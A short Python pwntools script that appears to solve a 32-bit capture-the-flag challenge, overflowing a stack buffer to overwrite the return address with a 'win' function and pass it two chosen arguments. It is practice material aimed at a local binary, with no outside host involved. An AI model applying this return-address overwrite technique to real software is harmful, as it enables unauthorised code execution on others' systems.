#!/usr/bin/env python3

from pwn import *

io = process("./chall-4-32")

exe = ELF("./chall-4-32")

gdb.attach(io)

arg1 = p32(0x7a69)
# arg2 = p32(0xfffffac7)
arg2 = pack(-1337, 32, 'little', True)

win = exe.symbols['win']
main = exe.symbols['main']

pad = 0x18 + 0x4

payload = b"A" * pad + p32(win) + p32(main) + arg1 + arg2

payload = flat({
    pad: win,
    pad+0x4: main,
    pad+0x8: 31337,
    pad+0xc: -1337,
})

io.sendlineafter(b"Buf: ", payload)
log.info(io.recvline())
io.sendlineafter(b"Buf: ", b"1")

io.interactive()
